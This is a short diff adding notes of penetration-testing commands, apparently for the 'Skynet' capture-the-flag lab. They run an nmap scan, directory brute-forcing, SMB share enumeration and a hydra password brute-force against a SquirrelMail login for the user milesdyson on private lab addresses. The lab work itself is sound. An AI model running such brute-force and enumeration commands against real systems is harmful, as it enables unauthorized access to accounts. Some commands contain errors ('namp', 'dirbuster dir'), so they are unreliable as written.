@@ -1,0 +1,5 @@
+namp -sV -sT <target IP>
+dirbuster dir -u http://10.10.194.235 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+smbmap -H <target IP>
+
+hydra -l milesdyson -P "/home/kali/Desktop/Offisive Pentest/Skynet/log1.txt"  10.10.92.247 -V http-form-post '/squirrelmail/src/redirect.php:login_username=milesdyson&secretkey=^PASS^&js_autodetect_results=1&just_logged_in=1:F=Unknown User or password incorrect.'
